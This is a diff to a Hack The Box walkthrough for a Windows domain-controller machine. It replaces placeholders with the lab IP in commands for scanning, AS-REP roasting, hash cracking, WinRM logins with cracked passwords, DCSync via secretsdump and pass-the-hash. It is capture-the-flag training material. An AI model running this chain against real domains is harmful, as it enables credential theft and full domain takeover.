@@ -5,6 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Windows |
 | **Difficulty** | Easy |
+| **IP** | `10.129.82.175` |
 | **Domain** | `egotistical-bank.local` |
 
 ## Synopsis
@@ -24,8 +25,8 @@ finds **autologon credentials** in the registry for the `svc_loanmgr` account, w
 ### Nmap
 
 ```bash
-nmap -p- --min-rate=5000 -T4 <target>
-nmap -p53,80,88,135,139,389,445,464,593,636,3268,5985 -sCV <target>
+nmap -p- --min-rate=5000 -T4 10.129.82.175
+nmap -p53,80,88,135,139,389,445,464,593,636,3268,5985 -sCV 10.129.82.175
 ```
 
 A Domain Controller with a web server on 80. Add `egotistical-bank.local` to `/etc/hosts`.
@@ -48,7 +49,7 @@ Kerb* ...). Generate candidate usernames with common conventions (`fsmith`, `fer
 Request AS-REPs for the candidate users; `fsmith` has pre-auth disabled:
 
 ```bash
-GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -no-pass -dc-ip <target>
+GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -no-pass -dc-ip 10.129.82.175
 # $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
 ```
 
@@ -62,7 +63,7 @@ hashcat -m 18200 fsmith.asrep /usr/share/wordlists/rockyou.txt
 Log in over WinRM:
 
 ```bash
-evil-winrm -i <target> -u fsmith -p 'Thestrokes23'
+evil-winrm -i 10.129.82.175 -u fsmith -p 'Thestrokes23'
 ```
 
 The **user flag** is in `C:\Users\FSmith\Desktop\user.txt`.
@@ -85,7 +86,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 The real account name is `svc_loanmgr`:
 
 ```bash
-evil-winrm -i <target> -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+evil-winrm -i 10.129.82.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
 ### DCSync → Administrator
@@ -94,7 +95,7 @@ BloodHound (or `secretsdump`) shows `svc_loanmgr` has **GetChanges / GetChangesA
 domain — i.e. **DCSync** rights:
 
 ```bash
-secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@<target> \
+secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.82.175 \
   -just-dc-user Administrator
 # Administrator:500:aad3b...:<admin-nt-hash>:::
 ```
@@ -102,8 +103,8 @@ secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@<
 Pass-the-Hash as Administrator:
 
 ```bash
-psexec.py egotistical-bank.local/Administrator@<target> -hashes :<admin-nt-hash>
-# or: evil-winrm -i <target> -u Administrator -H <admin-nt-hash>
+psexec.py egotistical-bank.local/Administrator@10.129.82.175 -hashes :<admin-nt-hash>
+# or: evil-winrm -i 10.129.82.175 -u Administrator -H <admin-nt-hash>
 ```
 
 ```
